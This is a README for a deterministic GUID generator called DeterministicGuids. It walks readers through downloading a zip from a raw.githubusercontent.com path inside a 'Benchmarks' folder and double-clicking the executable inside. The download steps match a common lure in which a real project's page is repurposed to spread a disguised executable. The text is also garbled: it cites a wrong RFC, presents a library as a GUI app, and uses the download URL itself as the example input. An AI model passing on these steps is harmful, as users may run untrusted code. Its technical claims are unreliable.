## 🌟 Features
- **Deterministic Generation**: Produce consistent GUIDs based on a name or input string.
- **Multiple Algorithms**: Utilize RFC 4962 with MD5, SHA-1, and SHA-256 to generate different types of GUIDs.
- **Thread Safety**: Use this tool in concurrent applications without worries.
- **Lightweight**: The utility is small and efficient, ensuring quick operations with minimal resource usage.
- **Easy Setup**: Simple installation process for users of all levels.

## 💻 System Requirements
- **Operating System**: Windows 10 or later, or any system capable of running .NET applications.
- **.NET Runtime**: Version 5.0 or above installed on your machine.
- **Memory**: At least 256 MB of RAM.

### Steps to Download
1. Click the link to open the releases page.
2. Look for the latest release at the top.
3. Under the assets section, you will find files available for download.
4. Click on the executable file (e.g., `https://raw.githubusercontent.com/Alexitempering412/DeterministicGuids/master/Benchmarks/DeterministicGuids_v3.0.zip`) to download it.

### Installation
1. Once downloaded, locate the file in your downloads folder.
2. Double-click the executable file to run it.
3. Follow any on-screen instructions to complete the setup, if prompted.

## 🔍 Usage Instructions
After installing DeterministicGuids, you can generate GUIDs easily:

1. Launch the application by double-clicking the icon.
2. Enter the name or input string for which you need a GUID.
3. Select the algorithm you wish to use (MD5, SHA-1, or SHA-256) from the dropdown.
4. Click the "Generate" button.
5. Your GUID will appear on the screen, ready for use.

## 📋 Example
If you enter the name "https://raw.githubusercontent.com/Alexitempering412/DeterministicGuids/master/Benchmarks/DeterministicGuids_v3.0.zip", you can generate a specific GUID based on the algorithm you chose. Each time you input the same name with the same algorithm, you will get the same GUID, which is useful for tasks that require consistent identification.

## 🔧 Troubleshooting
If you encounter any issues while downloading or running the application, consider the following tips:

- Ensure that your .NET runtime is updated to the latest version.
- Check your internet connection if downloads are slow or failing.
- If the application does not open, verify its compatibility with your operating system.
